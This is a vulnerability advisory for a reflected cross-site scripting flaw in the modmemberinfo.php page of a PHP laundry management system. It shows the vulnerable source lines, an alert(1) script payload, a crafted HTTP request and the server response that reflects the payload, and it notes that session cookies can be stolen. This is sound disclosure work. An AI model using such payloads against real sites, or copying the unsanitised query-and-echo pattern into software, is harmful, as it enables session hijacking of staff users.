## SIMPLE_LAUNDRY_SYSTEM modmemberinfo.php Reflected Cross-Site Scripting Vulnerability

### I. Vulnerability Impact

The `userid` parameter of `modmemberinfo.php` is concatenated into a `SELECT` statement without validation, and the MySQL error produced by the malformed input is echoed into the HTML page with the attacker's characters intact. An attacker who sends a crafted link therefore runs arbitrary JavaScript in the browser of any staff member or administrator who opens it, inside the member management area of the application. The session cookie is issued without the `HttpOnly` flag, so the injected script can read `document.cookie` and take over the victim's staff session.

### II. Source Code Analysis

The vulnerability resides in `modmemberinfo.php`, lines 28-34:

```php
$userid = $_GET['userid'];
$q = "select * from member where memberId=$userid";
$result = $mysqli->query($q);
if(!$result){
    echo "Select failed: ".$mysqli->error;
}
$urow = $result->fetch_array();
```

`$userid` is read from `$_GET` and appended to `memberId=` without quotes, so the value is treated as a SQL expression rather than as a string. Any non-numeric input makes the statement invalid, `$mysqli->query()` returns `false` and line 32 copies the MySQL error message into the response with a plain `echo`.

MySQL reproduces the offending fragment of the statement inside that error message, which means the attacker's markup is written back into the document without `htmlspecialchars()`, `htmlentities()` or `strip_tags()` being applied anywhere. Since the page is delivered as `Content-Type: text/html; charset=UTF-8`, the browser parses the reflected string as markup and executes the tag it contains — the database error message acts as the XSS sink.

The file only pulls in `connect.php` and contains no `session_start()` and no session check, so the reflection is available to unauthenticated requests. Line 34 then calls `fetch_array()` on the boolean `false` and raises a fatal error, which is also printed in the response.

### III. Payload

The injection payload is:

```
<ScRiPt>alert(1)</ScRiPt>
```

The parameter is unquoted in the statement, so the payload turns the query into a syntax error whose message quotes the injected fragment:

```sql
select * from member where memberId=<ScRiPt>alert(1)</ScRiPt>
```

and that error is written into the page without encoding:

```html
Select failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<ScRiPt>alert(1)</ScRiPt>' at line 1<br />
```

```
GET /modmemberinfo.php?userid=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/membermanagement.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The payload is returned inside an HTML document without any encoding, which proves that the browser will parse and execute it:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:26:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 1000

<!DOCTYPE html>
<html>
<head>
<title>ITS351_PROJECT</title>
<link rel="stylesheet" type="text/css" href="stylesbackup1.css">
...
</div>
</div>

  <body>
    Select failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<ScRiPt>alert(1)</ScRiPt>' at line 1<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_array() on bool in E:\phpstudy_pro\WWW\bbn\modmemberinfo.php:34
Stack trace:
#0 {main}
thrown in <b>E:\phpstudy_pro\WWW\bbn\modmemberinfo.php</b> on line <b>34</b><br />
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030172807238](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030172807238.png)
